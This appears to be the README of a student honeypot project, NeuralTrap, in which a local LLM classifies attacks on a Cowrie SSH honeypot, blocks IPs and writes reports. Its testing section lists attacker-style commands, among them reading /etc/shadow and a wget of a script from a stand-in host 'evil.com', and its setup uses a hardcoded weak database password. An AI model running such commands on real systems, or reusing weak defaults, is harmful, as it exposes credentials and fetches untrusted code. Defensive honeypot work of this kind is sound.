# 🛡️ NeuralTrap — AI-Powered Deception Network

<p align="center">
  <strong>An autonomous, intelligence-driven honeypot system that uses Large Language Models to detect, classify, and neutralize cyber threats in real time.</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.10+-blue?style=for-the-badge&logo=python" alt="Python"/>
  <img src="https://img.shields.io/badge/LLM-Llama_3.2-orange?style=for-the-badge&logo=meta" alt="LLM"/>
  <img src="https://img.shields.io/badge/Honeypot-Cowrie-green?style=for-the-badge" alt="Cowrie"/>
  <img src="https://img.shields.io/badge/Dashboard-Streamlit-red?style=for-the-badge&logo=streamlit" alt="Streamlit"/>
  <img src="https://img.shields.io/badge/Database-MySQL-blue?style=for-the-badge&logo=mysql" alt="MySQL"/>
</p>

---

## 📖 What is NeuralTrap?

**NeuralTrap** is an advanced cybersecurity defense platform that combines the deceptive power of SSH honeypots with the intelligence of modern AI. It deploys a fake server that mimics a real Linux system, luring attackers into interacting with it. Every keystroke, login attempt, file download, and command is captured, analyzed in real time by a local Large Language Model (Llama 3.2 via Ollama), and automatically classified by threat severity.

Unlike traditional honeypots that passively collect logs, NeuralTrap is an **active defense system** — it understands what the attacker is doing, predicts their next move, generates professional forensic reports, and automatically blocks dangerous IPs at the firewall level, all without human intervention.

The system was built as a graduation / capstone project to demonstrate how AI can revolutionize network security through intelligent deception and autonomous threat response.

---

## 🎯 What Does the Project Do?

NeuralTrap operates as a fully automated cyber defense pipeline:

1. **Deploys a Honeypot** — Cowrie SSH honeypot runs on the network, pretending to be a vulnerable Linux server. Attackers connect via SSH thinking they've compromised a real machine.

2. **Captures Everything** — Every event is logged in JSON format: login attempts (successful and failed), commands typed, files downloaded/uploaded, SSH client fingerprints (HASSH), key exchange algorithms, and session metadata.

3. **Analyzes in Real Time** — NeuralTrap watches the Cowrie log file using filesystem watchers. As new events arrive, each command is scored for threat level by the LLM. Every 3 commands (or on detection of dangerous keywords), a full session classification is triggered.

4. **Classifies Attacks with AI** — The LLM analyzes the full command chain along with session intelligence (auth data, file transfers, client version, dwell time) and returns: attack type, threat score (0–100%), confidence level, reasoning, predicted next command, and MITRE ATT&CK technique IDs.

5. **Blocks Threats Automatically** — When a session's threat score exceeds 85%, the attacker's IP is instantly blocked via `iptables` firewall rules and logged to the database.

6. **Generates Forensic Reports** — The AI writes professional incident reports in plain English covering: who the attacker is, what they did step-by-step, why they did it, their predicted next move, risk assessment, and recommended actions.

7. **Analyzes Malware** — Any files downloaded by attackers are automatically analyzed by the LLM for malware family identification, capabilities, and Indicators of Compromise (IOCs).

8. **Detects Honeytoken Interaction** — AI-generated fake sensitive files (AWS credentials, SSH keys, WordPress configs) are planted in the honeypot. When an attacker accesses them, they're instantly flagged as critical threats.

9. **Visualizes Everything** — A cyberpunk-themed real-time dashboard displays all intelligence: attack maps, threat timelines, session details, MITRE heatmaps, forensic reports, and more.

---

## ✨ Features

### 🧠 AI-Powered Threat Intelligence
- **Dynamic LLM Classification** — No hardcoded attack labels. The AI analyzes behavior patterns and generates descriptive attack types (e.g., "Cryptominer Deployment", "IoT Botnet Recruitment", "Lateral Movement Attempt").
- **Real-Time Threat Scoring** — Each command is individually scored for danger level. Session-wide classification runs periodically with full context.
- **Attack Prediction** — The AI predicts the attacker's most likely next command based on the observed attack chain.
- **MITRE ATT&CK Mapping** — Every session is automatically mapped to MITRE ATT&CK technique IDs for standardized threat intelligence.
- **Confidence Assessment** — Each classification includes a confidence rating (low/medium/high) so analysts know how much to trust the AI's judgment.

### 🔥 Automated Firewall Response
- **Instant IP Blocking** — IPs exceeding the 85% threat threshold are automatically blocked via `iptables` DROP rules.
- **Duplicate Prevention** — Already-blocked IPs are detected before adding redundant rules.
- **Database Logging** — Every block action is recorded with the attack type, threat score, session ID, timestamp, and reason.
- **Unblock Capability** — Security teams can reverse blocks when needed.

### 📋 AI Forensic Reporting
- **Automated Incident Reports** — The LLM generates professional forensic reports for every high-threat session.
- **Structured Analysis** — Reports cover: attacker profile, step-by-step actions, goals, predicted next moves, risk level, and recommended response.
- **Analyst Feedback Loop** — Security analysts can mark reports as accurate or inaccurate, creating a feedback mechanism for quality tracking.
- **Command Timeline Integration** — Reports include the full real-time scoring timeline for each command in the session.

### 🦠 Malware Intelligence Engine
- **Automated Payload Analysis** — Files downloaded by attackers are automatically captured and analyzed.
- **AI Reverse Engineering** — The LLM examines file contents (scripts) or extracted strings (binaries) to identify malware families, capabilities, and behavior.
- **IOC Extraction** — Indicators of Compromise (IPs, domains, crypto wallets) are automatically extracted from malware payloads.
- **Asynchronous Processing** — Malware analysis runs in background threads to avoid blocking the main event pipeline.

### 🍯 Dynamic Honeytoken System
- **AI-Generated Lures** — The LLM generates realistic fake sensitive files: AWS credentials, SSH private keys, and WordPress database configs.
- **Instant Detection** — When an attacker reads or downloads a honeytoken, the session is immediately flagged as critical (threat score = 100%).
- **Automatic Blocking** — Honeytoken triggers result in instant IP blocking and forensic report generation.

### 🔬 Deep Cowrie Session Intelligence
- **Login Tracking** — All authentication attempts (password and public key) are captured with usernames, password hashes, fingerprints, and success/failure status.
- **File Transfer Monitoring** — Uploads and downloads are tracked with URLs, filenames, SHA-256 hashes, and output paths.
- **SSH Client Fingerprinting** — Client versions and HASSH fingerprints are captured for attacker tool identification.
- **Key Exchange Analysis** — Full KEX algorithm negotiation data is stored for SSH implementation fingerprinting.
- **Dwell Time Tracking** — Session duration is calculated from connect to disconnect for behavioral profiling.
- **TTY Recording** — Terminal recording file paths are tracked and linked to sessions for full session replay capability.

### 📊 Cyberpunk Command Center Dashboard
- **11 Specialized Pages** — Overview, Live Attacks, Cowrie Intel, AI Predictions, Forensic Reports, Blocked IPs, Attacker Profiles, Attack World Map, Live Threat Monitor, Malware Intelligence, and Honeytoken Activity.
- **Extreme Cyberpunk UI** — Dark theme with neon cyan/purple accents, CRT scanline overlays, animated targeting brackets, glowing HUD metric cards, and terminal-style attack feeds.
- **Interactive Visualizations** — Plotly-powered charts: pie charts, bar graphs, histograms, line timelines, scatter geo maps, and MITRE tactic frequency heatmaps.
- **GeoIP Attack Mapping** — Attacker IPs are geolocated and plotted on an interactive world map with country-level attack statistics.
- **Auto-Refresh** — Optional 10-second auto-refresh for real-time monitoring during active engagements.

---

## 🛠️ Tools & Technologies

### Core Languages & Frameworks

| Technology | Purpose |
|---|---|
| **Python 3.10+** | Primary programming language for all system components |
| **Streamlit** | Web dashboard framework for the cyberpunk command center |
| **Ollama** | Local LLM inference engine for running Llama 3.2 on-device |
| **Llama 3.2 (Meta)** | Large Language Model used for threat classification, forensic reporting, malware analysis, and honeytoken generation |

### Honeypot & Network Security

| Technology | Purpose |
|---|---|
| **Cowrie** | Medium-interaction SSH honeypot that emulates a Linux system |
| **iptables** | Linux kernel firewall for automatic IP blocking |
| **Watchdog** | Python filesystem monitoring library for real-time log watching |

### Database & Storage

| Technology | Purpose |
|---|---|
| **MySQL / MariaDB** | Relational database for storing all attack data, sessions, reports, and analysis results |
| **mysql-connector-python** | Python MySQL database driver |

### Data Visualization & Analytics

| Technology | Purpose |
|---|---|
| **Plotly** | Interactive charting library (pie charts, bar graphs, scatter maps, histograms, timelines) |
| **Pandas** | Data manipulation and analysis for dashboard queries |
| **GeoIP2 (MaxMind)** | IP geolocation for mapping attacker origins on the world map |

### UI & Design

| Technology | Purpose |
|---|---|
| **Custom CSS3** | Extreme cyberpunk styling: neon glows, CRT scanlines, animated HUD brackets, glassmorphism |
| **Google Fonts** | Orbitron (headings), Rajdhani (labels), Inter (body text) |
| **HTML5** | Custom components injected via Streamlit's `unsafe_allow_html` |

### DevOps & Scripting

| Technology | Purpose |
|---|---|
| **Bash** | Startup scripts and master test orchestration |
| **Threading** | Python threading for parallel LLM calls, report generation, and malware analysis |
| **JSON** | Data interchange format for Cowrie logs and LLM communication |

---

## 💡 Advantages of the Dashboard

### Real-Time Situational Awareness
The dashboard provides a **single-pane-of-glass** view of the entire honeypot operation. Security teams can monitor live attacks as they happen, see threat scores update in real time, and track attacker behavior across multiple sessions — all from a web browser.

### No Security Expertise Required to Understand
The AI generates forensic reports in **plain English**, not technical jargon. Anyone from a junior analyst to a C-suite executive can read a report and understand what happened, how dangerous it was, and what to do about it.

### Immersive Cyberpunk Design
The dashboard isn't just functional — it's **visually stunning**. The extreme cyberpunk aesthetic with neon glows, animated scanlines, and HUD-style metric cards makes monitoring engaging and keeps analysts alert during long shifts.

### Geographic Threat Intelligence
The Attack World Map page shows **exactly where attacks originate** globally, with country-level statistics and interactive drill-down. This helps organizations understand their threat landscape geographically.

### MITRE ATT&CK Integration
Every attack session is **automatically mapped to MITRE ATT&CK technique IDs**, the industry standard for threat classification. This enables direct integration with existing SOC workflows and threat intelligence platforms.

### Analyst Feedback Mechanism
Security analysts can **rate AI-generated reports** as accurate or inaccurate. This creates a quality feedback loop and helps track the AI's classification accuracy over time.

---

## 🤖 Advantages of the AI

### Zero Hardcoded Rules
Traditional honeypots rely on static rule sets and signature databases that must be constantly updated. NeuralTrap's LLM **dynamically generates attack classifications** based on behavioral analysis — it can identify novel attack patterns it has never seen before.

### Contextual Understanding
The AI doesn't just see individual commands — it analyzes the **full attack chain** including authentication patterns, file transfers, SSH fingerprints, dwell time, and command sequences to build a complete picture of the attacker's intent.

### Predictive Capability
NeuralTrap doesn't just react — it **predicts**. The AI forecasts the attacker's most likely next command, enabling proactive defense measures before damage occurs.

### Autonomous Operation
Once deployed, the system operates with **zero human intervention**. It detects, classifies, reports, and blocks threats 24/7 without needing a security analyst to be online.

### Local & Private
All AI processing runs **locally via Ollama** — no data is sent to cloud APIs. This ensures complete privacy and compliance with data sovereignty requirements. There's no API key needed and no per-query cost.

### Multi-Dimensional Analysis
The AI performs **four distinct analytical functions**: real-time command scoring, full session classification, forensic report generation, and malware payload analysis — all using the same local LLM.

### Adaptive Honeytoken Generation
The LLM generates **realistic fake sensitive files** that are indistinguishable from real credentials. Unlike static honeytokens, these can be regenerated with different content at any time.

---

## 🏗️ System Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        INTERNET                                  │
│                    (Attackers connect)                            │
└──────────────────────────┬──────────────────────────────────────┘
                           │ SSH (Port 2222)
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                    COWRIE HONEYPOT                                │
│           (Fake Linux system with honeytokens)                   │
│         Logs → ~/cowrie/var/log/cowrie/cowrie.json                │
└──────────────────────────┬──────────────────────────────────────┘
                           │ Filesystem Watch (Watchdog)
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                    NEURALTRAP ENGINE                              │
│                   (neuraltrap.py)                                 │
│                                                                   │
│  ┌───────────────┐  ┌──────────────┐  ┌───────────────────────┐  │
│  │  Log Parser   │→ │ LLM Classifier│→ │ Firewall (iptables)  │  │
│  │  & Enrichment │  │ (Ollama)      │  │ Auto-block ≥ 85%     │  │
│  └───────────────┘  └──────────────┘  └───────────────────────┘  │
│          │                  │                     │               │
│          ▼                  ▼                     ▼               │
│  ┌───────────────┐  ┌──────────────┐  ┌───────────────────────┐  │
│  │  Honeytoken   │  │  Forensic    │  │  Malware Analyzer     │  │
│  │  Detection    │  │  Report Gen  │  │  (Payload Analysis)   │  │
│  └───────────────┘  └──────────────┘  └───────────────────────┘  │
└──────────────────────────┬──────────────────────────────────────┘
                           │ MySQL
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                    MySQL DATABASE                                 │
│                                                                   │
│  Tables: attack_logs, realtime_scores, labeled_sessions,         │
│          blocked_ips, forensic_reports, malware_analysis,         │
│          honeytoken_triggers, login_attempts, file_transfers,    │
│          session_summary                                          │
└──────────────────────────┬──────────────────────────────────────┘
                           │ SQL Queries
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│               STREAMLIT DASHBOARD                                │
│          (Cyberpunk Command Center)                               │
│                                                                   │
│  11 Pages: Overview, Live Attacks, Cowrie Intel, AI Predictions, │
│  Forensic Reports, Blocked IPs, Attacker Profiles, World Map,   │
│  Live Threat Monitor, Malware Intelligence, Honeytoken Activity  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 📁 Project Structure

| File | Description |
|---|---|
| `neuraltrap.py` | **Core engine** — Log watcher, event processor, session manager, LLM orchestrator, firewall integration |
| `dashboard.py` | **Streamlit dashboard** — 11-page cyberpunk command center with real-time visualizations |
| `llm_classifier.py` | **AI classifier** — LLM-based threat classification with MITRE mapping and rule-based scoring |
| `forensic_analyst.py` | **Forensic AI** — Automated incident report generation for unanalyzed sessions |
| `malware_analyzer.py` | **Malware engine** — Automated payload analysis with IOC extraction |
| `firewall.py` | **Firewall module** — IP blocking/unblocking via iptables with database logging |
| `generate_honeytokens.py` | **Honeytoken generator** — AI-generated fake AWS creds, SSH keys, and WP configs |
| `cowrie_context.py` | **Session enrichment** — Timestamp parsing, TTY resolution, LLM-safe intel formatting |
| `db_schema.py` | **Database schema** — DDL for all 10 MySQL tables with indexes and migrations |
| `init_db.py` | **DB initializer** — One-shot database and table creation |
| `log_to_db.py` | **Log importer** — Bulk import existing Cowrie JSON logs into the database |
| `clear_db.py` | **DB cleanup** — Truncate all tables for fresh testing |
| `start_neuraltrap.sh` | **Startup script** — Launch all NeuralTrap components |

---

## 🚀 Getting Started

### Prerequisites

- **Linux** (Kali Linux recommended)
- **Python 3.10+**
- **MySQL / MariaDB**
- **Ollama** with **Llama 3.2** model pulled
- **Cowrie SSH Honeypot** installed and configured

### Installation

```bash
# 1. Clone the repository
git clone https://github.com/AdhamTarek404/project2.git
cd project2

# 2. Install Python dependencies
pip install streamlit mysql-connector-python pandas plotly ollama watchdog geoip2

# 3. Pull the Llama 3.2 model
ollama pull llama3.2

# 4. Set up the MySQL database
mysql -u root -p -e "CREATE DATABASE neuraltrap; CREATE USER 'neuraltrap'@'localhost' IDENTIFIED BY 'neuraltrap123'; GRANT ALL ON neuraltrap.* TO 'neuraltrap'@'localhost';"

# 5. Initialize tables
python init_db.py

# 6. (Optional) Generate honeytokens
python generate_honeytokens.py

# 7. Start the Cowrie honeypot
cd ~/cowrie && bin/cowrie start

# 8. Start NeuralTrap engine
python neuraltrap.py

# 9. Launch the dashboard (in a new terminal)
streamlit run dashboard.py
```

---

## 🧪 Testing

To test the system, connect to the Cowrie honeypot via SSH and interact with it as an attacker would:

```bash
ssh root@localhost -p 2222
```

Once inside, type commands like `whoami`, `uname -a`, `cat /etc/shadow`, or `wget http://evil.com/malware.sh` to trigger NeuralTrap's real-time AI classification, threat scoring, and automatic blocking.

---

## 📊 Database Schema

NeuralTrap uses **10 MySQL tables** to store all intelligence:

| Table | Purpose |
|---|---|
| `attack_logs` | Raw event log from Cowrie (every event) |
| `realtime_scores` | Per-command threat scores from the LLM |
| `labeled_sessions` | Final session classifications with Cowrie enrichment |
| `blocked_ips` | Automatically blocked IP addresses |
| `forensic_reports` | AI-generated incident reports |
| `malware_analysis` | Malware payload analysis results and IOCs |
| `honeytoken_triggers` | Alerts from honeytoken file interactions |
| `login_attempts` | SSH login attempts (password and public key) |
| `file_transfers` | File uploads and downloads with hashes |
| `session_summary` | Aggregated session metadata (dwell, client, TTY) |

---

## 🔮 Future Enhancements

- **Multi-Honeypot Support** — Deploy NeuralTrap across multiple honeypots with centralized intelligence.
- **Threat Intelligence Feed Export** — Export IOCs and attack signatures to STIX/TAXII format for sharing with the security community.
- **Fine-Tuned Model** — Train a custom LLM on honeypot data for even more accurate classifications.
- **Email/Slack Alerting** — Real-time notifications for critical threats.
- **Attacker Behavior Clustering** — Use ML to group similar attack sessions and identify campaigns.
- **API Endpoint** — RESTful API for integration with SIEM platforms (Splunk, Elastic, QRadar).

---

## 👥 Authors

- **Adham Tarek** — Developer & Security Researcher

---

## 📄 License

This project is developed for educational and research purposes.

---

<p align="center">
  <strong>🛡️ NeuralTrap — Because the best defense is intelligent deception. 🛡️</strong>
</p>
